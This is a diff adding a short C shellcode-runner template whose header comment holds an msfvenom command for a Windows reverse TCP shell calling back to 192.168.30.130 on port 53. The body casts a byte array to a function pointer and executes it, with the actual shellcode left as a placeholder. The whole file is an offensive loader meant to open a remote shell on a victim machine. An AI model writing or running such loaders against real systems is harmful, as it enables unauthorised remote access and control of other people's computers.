@@ -1,0 +1,15 @@
+/* msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.130 LPORT=53 -f c
+ * windows/shell_reverse_tcp - Payload size: 324 bytes
+ * LHOST=192.168.30.130, LPORT=53, 
+ */
+unsigned char code[] = 
+
+/*ShellCode Goes Here*/
+
+;
+
+void main() {
+	int (*func)();
+	func = (int (*)()) code;
+	(int)(*func)();
+}
